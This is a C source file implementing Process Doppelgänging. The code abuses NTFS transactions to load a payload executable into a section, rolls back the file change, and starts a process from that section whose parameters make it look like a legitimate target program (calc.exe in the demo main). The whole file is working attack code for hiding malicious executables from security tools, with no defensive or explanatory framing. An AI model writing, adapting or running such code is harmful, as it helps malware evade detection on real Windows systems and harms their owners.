#include <Windows.h>
#include "ntos.h"

VOID ProcessDoppelgänging(
    _In_ LPWSTR lpTargetApp,
    _In_ LPWSTR lpPayloadApp)
{
	HINSTANCE hinstStub = GetModuleHandle(_T("ntdll.dll"));
	if(hinstStub) 
	{
		NtCreateTransaction = (LPNTCREATETRANSACTION)GetProcAddress(hinstStub, "NtCreateTransaction");
		if (!NtCreateTransaction) 
		{
			printf("Could not find NtCreateTransaction entry point in NTDLL.DLL");
			exit(0);
		}		
		NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtAllocateVirtualMemory");
		if (!NtAllocateVirtualMemory) 
		{
			printf("Could not find NtAllocateVirtualMemory entry point in NTDLL.DLL");
			exit(0);
		}
		NtCreateSection = (LPNTCREATESECTION)GetProcAddress(hinstStub, "NtCreateSection");
		if (!NtCreateSection) 
		{
			printf("Could not find NtCreateSection entry point in NTDLL.DLL");
			exit(0);
		}
		NtRollbackTransaction = (LPNTROLLBACKTRANSACTION)GetProcAddress(hinstStub, "NtRollbackTransaction");
		if (!NtRollbackTransaction) 
		{
			printf("Could not find NtRollbackTransaction entry point in NTDLL.DLL");
			exit(0);
		}
		NtClose = (LPNTCLOSE)GetProcAddress(hinstStub, "NtClose");
		if (!NtClose) 
		{
			printf("Could not find NtClose entry point in NTDLL.DLL");
			exit(0);
		}
		NtCreateProcessEx = (LPNTCREATEPROCESSEX)GetProcAddress(hinstStub, "NtCreateProcessEx");
		if (!NtCreateProcessEx) 
		{
			printf("Could not find NtClose entry point in NTDLL.DLL");
			exit(0);
		}
		NtQueryInformationProcess = (LPNTQUERYINFORMATIONPROCESS)GetProcAddress(hinstStub, "NtQueryInformationProcess");
		if (!NtQueryInformationProcess) 
		{
			printf("Could not find NtClose entry point in NTDLL.DLL");
			exit(0);
		}
		NtReadVirtualMemory = (LPNTREADVIRTUALMEMORY)GetProcAddress(hinstStub, "NtReadVirtualMemory");
		if (!NtReadVirtualMemory) 
		{
			printf("Could not find NtClose entry point in NTDLL.DLL");
			exit(0);
		}
		NtWriteVirtualMemory = (LPNTWRITEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtWriteVirtualMemory");
		if (!NtWriteVirtualMemory) 
		{
			printf("Could not find NtClose entry point in NTDLL.DLL");
			exit(0);
		}
		NtCreateThreadEx = (LPNTCREATETHREADEX)GetProcAddress(hinstStub, "NtCreateThreadEx");
		if (!NtCreateThreadEx) 
		{
			printf("Could not find NtCreateThreadEx entry point in NTDLL.DLL");
			exit(0);
		}
		NtFreeVirtualMemory = (LPNTFREEVIRTUALMEMORY)GetProcAddress(hinstStub, "NtFreeVirtualMemory");
		if (!NtFreeVirtualMemory) 
		{
			printf("Could not find NtFreeVirtualMemory entry point in NTDLL.DLL");
			exit(0);
		}
		RtlCreateProcessParametersEx = (LPRTLCREATEPROCESSPARAMETERSEX)GetProcAddress(hinstStub, "RtlCreateProcessParametersEx");
		if (!RtlCreateProcessParametersEx) 
		{
			printf("Could not find RtlCreateProcessParametersEx entry point in NTDLL.DLL");
			exit(0);
		}
		RtlDestroyProcessParameters = (LPRTLDESTROYPROCESSPARAMETERS)GetProcAddress(hinstStub, "RtlDestroyProcessParameters");
		if (!RtlDestroyProcessParameters) 
		{
			printf("Could not find RtlCreateProcessParametersEx entry point in NTDLL.DLL");
			exit(0);
		}
		RtlImageNtHeader = (LPRTLIMAGENTHEADER)GetProcAddress(hinstStub, "RtlImageNtHeader");
		if (!RtlImageNtHeader) 
		{
			printf("Could not find RtlImageNtHeader entry point in NTDLL.DLL");
			exit(0);
		}
		RtlInitUnicodeString = (LPRTLINITUNICODESTRING)GetProcAddress(hinstStub, "RtlInitUnicodeString");
		if (!RtlInitUnicodeString) 
		{
			printf("Could not find RtlInitUnicodeString entry point in NTDLL.DLL");
			exit(0);
		}
	}
	else
	{
		printf("Could not GetModuleHandle of NTDLL.DLL");
		exit(0);
	}
		
	BOOL bCond = FALSE;
    NTSTATUS status;
    HANDLE hTransaction = NULL, hTransactedFile = INVALID_HANDLE_VALUE, hFile = INVALID_HANDLE_VALUE;
    HANDLE hSection = NULL, hProcess = NULL, hThread = NULL;
    LARGE_INTEGER fsz;
    ULONG ReturnLength = 0;
    ULONG_PTR EntryPoint = 0, ImageBase = 0;
    PVOID Buffer = NULL, MemoryPtr = NULL;
    SIZE_T sz = 0;
    PEB *Peb;

    PROCESS_BASIC_INFORMATION pbi;

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING    ustr;

    BYTE temp[0x1000];

    do {
        RtlSecureZeroMemory(&temp, sizeof(temp));
        //
        // Create TmTx transaction object.
        //
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        status = NtCreateTransaction(&hTransaction,
            TRANSACTION_ALL_ACCESS,
            &obja,
            NULL,
            NULL,
            0,
            0,
            0,
            NULL,
            NULL);

        if (!NT_SUCCESS(status)) {
            printf("NtCreateTransaction fail\n");
            break;
        }
        //
        // Open target file for transaction.
        //
        hTransactedFile = CreateFileTransacted(lpTargetApp,
            GENERIC_WRITE | GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL,
            hTransaction,
            NULL,
            NULL);

        if (hTransactedFile == INVALID_HANDLE_VALUE) {
            printf("CreateFileTransacted fail:%d\n",GetLastError());
            break;
        }
        //
        // Open file payload.
        //
        hFile = CreateFile(lpPayloadApp,
            GENERIC_READ,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            printf("CreateFile(target) failed\n");
            break;
        }
        //
        // Query payload file size.
        //
        if (!GetFileSizeEx(hFile, &fsz)) {
            printf("GetFileSizeEx failed\n");
            break;
        }
        //
        // Allocate buffer for payload file.
        //
        Buffer = NULL;
        sz = (SIZE_T)fsz.LowPart;
        status = NtAllocateVirtualMemory(NtCurrentProcess(),
            &Buffer,
            0,
            &sz,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
			printf("NtAllocateVirtualMemory failed\n");
            break;
        }

        //
        // Read payload file to the buffer.
        //
        if (!ReadFile(hFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
            printf("ReadFile failed\n");
            break;
        }

        CloseHandle(hFile);
        hFile = INVALID_HANDLE_VALUE;
        //
        // Write buffer into transaction.
        //
        if (!WriteFile(hTransactedFile, Buffer, fsz.LowPart, &ReturnLength, NULL)) {
            printf("WriteFile failed\n");
            break;
        }
        //
        // Create section from transacted file.
        //
        status = NtCreateSection(&hSection,
            SECTION_ALL_ACCESS,
            NULL,
            0,
            PAGE_READONLY,
            SEC_IMAGE,
            hTransactedFile);
        if (!NT_SUCCESS(status)) {
            printf("NtCreateSection(hTransactedFile) failed\n");
            break;
        }

        status = NtRollbackTransaction(hTransaction, TRUE);
        if (!NT_SUCCESS(status)) {
            printf("NtRollbackTransaction(hTransaction) failed\n");
            break;
        }

        NtClose(hTransaction);
        hTransaction = NULL;

        CloseHandle(hTransactedFile);
        hTransactedFile = INVALID_HANDLE_VALUE;
        //
        // Create process object with transacted section.
        //
        //
        // Warning: due to MS brilliant coding skills (NULL ptr dereference) 
        //          this call will trigger BSOD on Windows 10 prior to RS3.
        //
        hProcess = NULL;
        status = NtCreateProcessEx(&hProcess,
            PROCESS_ALL_ACCESS,
            NULL,
            NtCurrentProcess(),
            PS_INHERIT_HANDLES,
            hSection,
            NULL,
            NULL,
            FALSE);

        if (!NT_SUCCESS(status)) {
            printf("NtCreateProcessEx(hSection) failed\n");
            break;
        }
        //
        // Query payload file entry point value.
        //
        status = NtQueryInformationProcess(hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            &ReturnLength);

        if (!NT_SUCCESS(status)) {
            printf("NtQueryInformationProcess failed\n");
            break;
        }

        status = NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &temp, 0x1000, &sz);
        if (!NT_SUCCESS(status)) {
            printf("NtReadVirtualMemory failed\n");
            break;
        }

 //       EntryPoint = (ULONG_PTR)RtlImageNtHeader(Buffer)->OptionalHeader.AddressOfEntryPoint;
        EntryPoint = (RtlImageNtHeader(Buffer))->OptionalHeader.AddressOfEntryPoint;
		
		EntryPoint += (ULONG_PTR)((PPEB)temp)->ImageBaseAddress;
        //
        // Create process parameters block.
        //
        //RtlInitUnicodeString(&ustr, L"C:\\windows\\system32\\svchost.exe");
        RtlInitUnicodeString(&ustr, lpTargetApp);
        status = RtlCreateProcessParametersEx(&ProcessParameters,
            &ustr,
            NULL,
            NULL,
            &ustr,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL,
            RTL_USER_PROC_PARAMS_NORMALIZED);

        if (!NT_SUCCESS(status)) {
            printf("RtlCreateProcessParametersEx failed\n");
            break;
        }
        //
        // Allocate memory in target process and write process parameters block.
        //
        sz = ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength;
        MemoryPtr = ProcessParameters;

        status = NtAllocateVirtualMemory(hProcess,
            &MemoryPtr,
            0,
            &sz,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE);

        if (!NT_SUCCESS(status)) {
            printf("NtAllocateVirtualMemory(ProcessParameters) failed\n");
            break;
        }
        sz = 0;
        status = NtWriteVirtualMemory(hProcess,
            ProcessParameters,
            ProcessParameters,
            ProcessParameters->EnvironmentSize + ProcessParameters->MaximumLength,
            &sz);

        if (!NT_SUCCESS(status)) {
            printf("NtWriteVirtualMemory(ProcessParameters) failed\n");
            break;
        }
        //
        // Update PEB->ProcessParameters pointer to newly allocated block.
        //
        Peb = (PEB *)pbi.PebBaseAddress;
        status = NtWriteVirtualMemory(hProcess,
            &Peb->ProcessParameters,
            &ProcessParameters,
            sizeof(PVOID),
            &sz);
        if (!NT_SUCCESS(status)) {
            printf("NtWriteVirtualMemory(Peb->ProcessParameters) failed\n");
            break;
        }
        //
        // Create primary thread.
        //
        hThread = NULL;
        status = NtCreateThreadEx(&hThread,
            THREAD_ALL_ACCESS,
            NULL,
            hProcess,
            (LPTHREAD_START_ROUTINE)EntryPoint,
            NULL,
            FALSE,
            0,
            0,
            0,
            NULL);
        if (!NT_SUCCESS(status)) {
            printf("NtCreateThreadEx(EntryPoint) failed\n");
            break;
        }

    } while (bCond);

    if (hTransaction)
        NtClose(hTransaction);
    if (hSection)
        NtClose(hSection);
    if (hProcess)
        NtClose(hProcess);
    if (hThread)
        NtClose(hThread);
    if (hTransactedFile != INVALID_HANDLE_VALUE)
        CloseHandle(hTransactedFile);
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (Buffer != NULL) {
        sz = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
    }
    if (ProcessParameters) {
        RtlDestroyProcessParameters(ProcessParameters);
    }
}

void main()
{
    ProcessDoppelgänging(L"C:\\1\\calc.exe", L"C:\\1\\hello1.exe");
    ExitProcess(0);
}
